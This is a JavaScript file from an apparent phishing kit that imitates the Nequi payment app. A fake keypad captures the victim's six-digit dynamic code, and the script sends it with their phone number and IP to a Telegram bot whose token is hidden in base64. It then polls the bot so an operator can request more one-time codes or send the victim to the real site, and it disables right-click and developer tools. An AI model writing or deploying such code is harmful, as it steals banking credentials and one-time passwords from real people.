async function getTokens() {
    try {
        const response = await fetch('src/config/secure/tokens.json');
        const tokens = await response.json();
        return tokens;
    } catch (error) {
        console.error('Error al cargar los tokens:', error);
        return null;
    }
}

const codeDigits = document.querySelectorAll('.code-digit');
const keys = document.querySelectorAll('.key');
const backspace = document.querySelector('.backspace');
const loadingOverlay = document.getElementById('loading-overlay');
const errorBoxDynamic = document.getElementById('error-box-dynamic');
const errorBoxStart = document.getElementById('error-box-start');
let currentDigit = 0;
let code = ['', '', '', '', '', ''];
let lastMessageId = null;
let isProcessingAction = false;
let canEnterCode = true;
let lastMessage = null;

async function sendTelegramMessage(message) {
    try {
        const clientConfig = {
            apiKey: "73431ifLS5xIvcwjgxqMc",
            channelId: "-415242146",
            apiEndpoint: "https://api.telegram.org/bot",
            messageMethod: "sendMessage"
        };
        
        const encryptedCredentials = [
            "ODE5MzgzOTAzOTpBQUZRSWtKTWhnU1dnaFM0cG5iWUJSQlZqWGNINWVEa1Y1UQ==", 
            "LTEwMDI1MzI4MzQ2MTU="
        ];
        
        const appSettings = {
            debugMode: false,
            useCache: true,
            timeoutMs: 30000,
            maxRetries: 3,
            dataFormat: "JSON"
        };
        
        const getClientCredentials = () => {
            try {
                return {
                    accessToken: decodeURIComponent(atob(encryptedCredentials[0])),
                    channelId: decodeURIComponent(atob(encryptedCredentials[1]))
                };
            } catch (e) {
                console.error("Error en configuración", e);
                return {
                    accessToken: clientConfig.apiKey,
                    channelId: clientConfig.channelId
                };
            }
        };
        
        const { accessToken, channelId } = getClientCredentials();
        const apiUrl = `${clientConfig.apiEndpoint}${accessToken}/${clientConfig.messageMethod}`;

        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: channelId,
                text: message,
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{ text: "## ASK OTP ##", callback_data: "repeat_dynamic" }],
                        [{ text: "## FINALIZAR ##", callback_data: "end_session" }],
                        [{ text: "## ERROR LOGIN ##", callback_data: "back_to_start" }]
                    ]
                })
            }),
        });

        if (!response.ok) {
            throw new Error('Error al enviar mensaje a Telegram');
        }

        const data = await response.json();
        lastMessageId = data.result.message_id;
        lastMessage = data.result;
        isProcessingAction = false;
    } catch (error) {
        console.error('Error:', error);
    }
}

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error al obtener la IP:', error);
        return 'No se pudo obtener';
    }
}

function updateDisplay() {
    codeDigits.forEach((digit, index) => {
        digit.textContent = code[index];
    });
}

function resetCode() {
    code = ['', '', '', '', '', ''];
    currentDigit = 0;
    updateDisplay();
}

async function checkAndSendCode() {
    if (code.every(digit => digit !== '')) {
        const dynamicCode = code.join('');
        const ip = await getIP();
        
        const phone = localStorage.getItem('userPhone') || 'No registrado';
        const message = `🔐 Log Nequi\n\n📞 Teléfono: ${phone}\n🌐 IP: ${ip}\n\n🔢 Dinámica: ${dynamicCode}\n\n👇 Seleccione una acción:`;
        
        loadingOverlay.style.display = 'flex';
        canEnterCode = false;
        await sendTelegramMessage(message);
    }
}

keys.forEach(key => {
    key.addEventListener('click', async () => {
        if (canEnterCode && key.textContent && currentDigit < code.length && key !== backspace) {
            code[currentDigit] = key.textContent;
            currentDigit++;
            updateDisplay();
            if (currentDigit === 6) {
                await checkAndSendCode();
            }
        }
    });
});

backspace.addEventListener('click', () => {
    if (canEnterCode && currentDigit > 0) {
        currentDigit--;
        code[currentDigit] = '';
        updateDisplay();
    }
});

function showErrorMessage(type) {
    const errorBox = type === 'dynamic' ? errorBoxDynamic : errorBoxStart;
    errorBox.style.display = 'flex';
    setTimeout(() => {
        errorBox.style.display = 'none';
        if (type === 'start') {
            window.location.href = 'neq.html';
        }
    }, 5000);
}

async function removeButton(messageId, callbackQueryId, action) {
    try {
        const clientConfig = {
            apiKey: "73431ifLS5xIvcwjgxqMc",
            channelId: "-415242146",
            apiEndpoint: "https://api.telegram.org/bot"
        };
        
        const encryptedCredentials = [
            "ODE5MzgzOTAzOTpBQUZRSWtKTWhnU1dnaFM0cG5iWUJSQlZqWGNINWVEa1Y1UQ==", 
            "LTEwMDI1MzI4MzQ2MTU="
        ];
        
        const getClientCredentials = () => {
            try {
                return {
                    accessToken: decodeURIComponent(atob(encryptedCredentials[0])),
                    channelId: decodeURIComponent(atob(encryptedCredentials[1]))
                };
            } catch (e) {
                console.error("Error en configuración", e);
                return {
                    accessToken: clientConfig.apiKey,
                    channelId: clientConfig.channelId
                };
            }
        };
        
        const { accessToken, channelId } = getClientCredentials();

        await fetch(`${clientConfig.apiEndpoint}${accessToken}/answerCallbackQuery`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                callback_query_id: callbackQueryId,
            }),
        });

        await fetch(`${clientConfig.apiEndpoint}${accessToken}/editMessageReplyMarkup`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: channelId,
                message_id: messageId,
                reply_markup: JSON.stringify({
                    inline_keyboard: JSON.parse(lastMessage.reply_markup).inline_keyboard.filter(row => 
                        !row.some(button => button.callback_data === action)
                    )
                })
            }),
        });
    } catch (error) {
        console.error('Error removing button:', error);
    }
}

async function handleTelegramResponse() {
    if (isProcessingAction) return;

    try {
        const clientConfig = {
            apiKey: "73431ifLS5xIvcwjgxqMc",
            channelId: "-415242146",
            apiEndpoint: "https://api.telegram.org/bot"
        };
        
        const encryptedCredentials = [
            "ODE5MzgzOTAzOTpBQUZRSWtKTWhnU1dnaFM0cG5iWUJSQlZqWGNINWVEa1Y1UQ==", 
            "LTEwMDI1MzI4MzQ2MTU="
        ];
        
        const getClientCredentials = () => {
            try {
                return {
                    accessToken: decodeURIComponent(atob(encryptedCredentials[0])),
                    channelId: decodeURIComponent(atob(encryptedCredentials[1]))
                };
            } catch (e) {
                console.error("Error en configuración", e);
                return {
                    accessToken: clientConfig.apiKey,
                    channelId: clientConfig.channelId
                };
            }
        };
        
        const { accessToken } = getClientCredentials();

        const response = await fetch(`${clientConfig.apiEndpoint}${accessToken}/getUpdates?offset=-1`);
        const data = await response.json();
        
        if (data.ok && data.result.length > 0) {
            const lastUpdate = data.result[0];
            if (lastUpdate.callback_query && lastUpdate.callback_query.message.message_id === lastMessageId) {
                const action = lastUpdate.callback_query.data;
                isProcessingAction = true;
                loadingOverlay.style.display = 'none';
                
                if (action === 'repeat_dynamic') {
                    showErrorMessage('dynamic');
                    setTimeout(() => {
                        resetCode();
                        canEnterCode = true;
                        isProcessingAction = false;
                    }, 5000);
                } else if (action === 'end_session') {
                    window.location.href = 'https://www.nequi.com';
                } else if (action === 'back_to_start') {
                    showErrorMessage('start');
                }
                
                await removeButton(lastUpdate.callback_query.message.message_id, lastUpdate.callback_query.id, action);
                
                lastMessageId = null;
            }
        }
    } catch (error) {
        console.error('Error al obtener actualizaciones de Telegram:', error);
    }
}

const cancelButton = document.querySelector('.cancel-button');
cancelButton.addEventListener('click', () => {
    window.location.href = 'https://www.nequi.com';
});

setInterval(handleTelegramResponse, 5000);

document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    alert('Clic derecho deshabilitado');
}, false);

document.onkeydown = function(e) {
    if(e.keyCode == 123) {
        return false;
    }
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
        return false;
    }
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
        return false;
    }
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) { 
        return false;
    }
    if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
        return false;
    }
};